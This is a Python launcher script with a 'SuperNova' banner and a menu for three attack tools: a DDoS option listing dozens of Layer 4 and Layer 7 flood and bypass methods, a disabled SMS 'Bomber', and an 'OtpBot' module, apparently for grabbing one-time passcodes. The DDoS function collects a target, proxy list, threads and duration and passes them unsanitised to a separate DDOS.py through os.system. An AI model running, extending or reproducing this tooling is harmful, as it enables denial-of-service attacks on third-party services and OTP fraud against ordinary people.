from colorama import Fore as f
import os
import time


os.system('cls')
def menu():
 print(f.MAGENTA + '                                   _________                          _______                         ')
 print(f.MAGENTA + '                                  /   _____/__ ________   ___________ \      \   _______  _______     ')
 print(f.MAGENTA + '                                  \_____  \|  |  \____ \_/ __ \_  __ \/   |   \ /  _ \  \/ /\__  \    ')
 print(f.MAGENTA + '                                  /        \  |  /  |_> >  ___/|  | \/    |    (  <_> )   /  / __ \_  ')
 print(f.MAGENTA + '                                 /_______  /____/|   __/ \___  >__|  \____|__  /\____/ \_/  (____  /  ')
 print(f.MAGENTA + '                                         \/      |__|        \/              \/                  \/   ')
 print('                          ')
 print(f.LIGHTWHITE_EX + '                                 [1]' + f.RED + ' DDoS' + f.WHITE + '     [2]' + f.BLUE + ' Bomber' + f.LIGHTWHITE_EX + '     [3]' + f.GREEN + ' OtpBot                                 ')
 print('   ')
 select = input(f.LIGHTYELLOW_EX + '                                                                  > ')
 if select == '1':
    os.system('cls')
    ddos()
 if select == '2':
    os.system('cls')
    bomber()
 if select == '3':
    os.system('cls')
    otpbot()


def ddos():
    print(f.LIGHTBLACK_EX + 'Methods LAYER4')
    print(f.LIGHTWHITE_EX +  'MEM, MCBOT, UDP, VSE, CLDAP, ICMP, CHAR, RDP, MCPE, ARD, SYN, FIVEM, TCP, MINECRAFT, NTP, DNS, CONNECTION, TS3, CPS')
    print(f.LIGHTBLACK_EX + 'Methods LAYER7')
    print(f.LIGHTWHITE_EX + 'PPS, OVH, POST, STOMP, AVB, DYN, XMLRPC, BOT, APACHE, GSB, CFB, NULL, CFBUAM, EVEN, DOWNLOADER, BOMB, KILLER, RHEX, SLOW, GET, DGB, STRESS, HEAD, COOKIE, BYPASS, TOR')
    print(' ')
    layer = input('[LAYER (4 or 7)] => ')
    method = input(f.LIGHTGREEN_EX + '[METHOD] => ')
    target = input(f.LIGHTGREEN_EX + '[TARGET] => ')
    proxylist = input(f.LIGHTGREEN_EX + '[PROXY LIST] => ')
    sockstype = input(f.LIGHTGREEN_EX + '[SOCKS PROXY TYPE (4/5)] => ')
    threadz = input(f.LIGHTGREEN_EX + '[THREADS] => ')
    durationz = input(f.LIGHTGREEN_EX + '[DURATION] => ')
    time.sleep(1)
    if layer == '4':
       os.system(f"python DDOS.py {method} {target} {threadz} {durationz}")
    if layer == '7':
       os.system(f"python DDOS.py {method} {target} {sockstype} {threadz} {proxylist} 63 {durationz}")
    menu()

def bomber():
    print('updating this because all apis got patched')
    input()
    os.system('cls')
    menu()


def otpbot():
    os.system('python ./OTP_Module/bot.py')


menu()